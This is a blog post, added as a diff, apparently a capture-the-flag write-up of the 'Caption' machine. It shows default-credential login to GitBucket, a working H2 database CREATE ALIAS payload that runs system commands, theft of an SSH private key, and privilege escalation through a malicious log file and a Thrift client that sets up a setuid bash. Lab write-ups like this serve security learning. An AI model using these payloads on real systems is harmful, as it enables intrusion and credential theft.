@@ -1,0 +1,167 @@
+---
+layout: post
+title: "Caption d357fbf216864fc58a5316bbf22743b4"
+date: 2025-09-27
+categories: writeups
+---
+
+# Caption
+
+# 1. Enumeration
+
+Start with nmap enumeration
+
+![image.png]({{ '/assets/images/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e_image.png' | relative_url }})
+
+On port 80 there is a log in interface, but we didn’t find anything interesting there
+
+![image.png]({{ '/assets/images/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e_image_1.png' | relative_url }})
+
+Here we have another login interface, Gitbucket is running this time
+
+GitBucket is a Git web platform powered by Scala offering:
+
+- Easy installation
+- Intuitive UI
+- High extensibility by plugins
+- API compatibility with GitHub
+
+![image.png]({{ '/assets/images/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e_image_2.png' | relative_url }})
+
+We tried root-root
+
+![image.png]({{ '/assets/images/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e_image_3.png' | relative_url }})
+
+And we have log in successfully, then proceed to go to system administrator, that’s a good beginning trying to find  the foothold
+
+![image.png]({{ '/assets/images/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e_image_4.png' | relative_url }})
+
+# 2. User flag
+
+Of course an administrator interface, with plugins, system settings, and database viewer, here we find the complexity of this machine, there are several paths where we can try to get a vulnerability, as we have done before plugins are potentially exploitable when we are handling with java frameworks, this is a framework powered by scala but it is needed java 11 to install it, system settings would be interesting, at the same way than data export and database viewer. Well here we are going to check database looking for creds due to have ssh on port 22.
+
+![image.png]({{ '/assets/images/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e_image_5.png' | relative_url }})
+
+We have direct sql execution, there is a hash, but it is not easy crackeable
+
+![image.png]({{ '/assets/images/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e_image_6.png' | relative_url }})
+
+After some attempts we wouldn’t be able to get RCE only with SQL but as we saw before there is something of java out there so try to use it
+
+We create an alias in SQL H2 
+
+We throwed a java exception to run the command we wanted to
+
+Runtime is used to interact with the system and the output is capture by getInputStream, and delimiter is used to read the whole output, not line by line
+
+```bash
+CREATE ALIAS SHELT AS $$ String shelt(String cmd) throws
+java.io.IOException {
+	java.util.Scanner s = new
+	java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\\\A");
+	return s.hasNext() ? s.next():"";
+}$$;
+CALL SHELT('id');
+```
+
+![image.png]({{ '/assets/images/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e_image_7.png' | relative_url }})
+
+![image.png]({{ '/assets/images/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e_image_8.png' | relative_url }})
+
+That’s how we steal the margo private key
+
+![image.png]({{ '/assets/images/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e_image_9.png' | relative_url }})
+
+And we get the user flag
+
+![image.png]({{ '/assets/images/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e_image_10.png' | relative_url }})
+
+![image.png]({{ '/assets/images/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e_image_11.png' | relative_url }})
+
+# 3.Priv esc
+
+To escalate our privileges it is necessary to check open ports which we haven’t got access before, 9090 seems interesting
+
+![image.png]({{ '/assets/images/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e_image_12.png' | relative_url }})
+
+Forward the port, there is a service that handle logs, we can create a malicious log in this way
+
+![image.png]({{ '/assets/images/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e_image_13.png' | relative_url }})
+
+![image.png]({{ '/assets/images/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e_image_14.png' | relative_url }})
+
+![image.png]({{ '/assets/images/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e_image_15.png' | relative_url }})
+
+Create a malicious log executing a bash script, this bash script setuid of the current user
+
+![image.png]({{ '/assets/images/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e_image_16.png' | relative_url }})
+
+create the same .thrift file in our local machine to manage the log file
+
+![image.png]({{ '/assets/images/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e_image_17.png' | relative_url }})
+
+![image.png]({{ '/assets/images/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e_image_18.png' | relative_url }})
+
+```bash
+#This will create necessary python files to invoque and implement the service
+thrift -r --gen py log_service.thrift
+```
+
+![image.png]({{ '/assets/images/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e_image_19.png' | relative_url }})
+
+Now make the python script that will trigger the malicious log file created before
+
+![image.png]({{ '/assets/images/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e_image_20.png' | relative_url }})
+
+```bash
+from thrift import Thrift
+from thrift.transport import TSocket
+from thrift.transport import TTransport
+from thrift.protocol import TBinaryProtocol
+from log_service import LogService  # Import generated Thrift client code
+
+def main():
+    # Set up a transport to the server
+    transport = TSocket.TSocket('localhost', 9090)
+
+    # Buffering for performance
+    transport = TTransport.TBufferedTransport(transport)
+
+    # Using a binary protocol
+    protocol = TBinaryProtocol.TBinaryProtocol(transport)
+
+    # Create a client to use the service
+    client = LogService.Client(protocol)
+
+    # Open the connection
+    transport.open()
+
+    try:
+        # Specify the log file path to process
+        log_file_path = "/tmp/evil.log"
+        
+        # Call the remote method ReadLogFile and get the result
+        response = client.ReadLogFile(log_file_path)
+        print("Server response:", response)
+    
+    except Thrift.TException as tx:
+        print(f"Thrift exception: {tx}")
+
+    # Close the transport
+    transport.close()
+
+if __name__ == '__main__':
+    main()
+```
+
+![image.png]({{ '/assets/images/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e_image_21.png' | relative_url }})
+
+![image.png]({{ '/assets/images/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e_image_22.png' | relative_url }})
+
+![image.png]({{ '/assets/images/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e_image_23.png' | relative_url }})
+
+/bin/bash -p and
+
+![image.png]({{ '/assets/images/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e/df542b02-08c3-4a94-b62c-dc2fbb999130-export-b1aed7d6-3b2b-4b59-b684-2232b523086e_image_24.png' | relative_url }})
+
+Machine pwned!!!
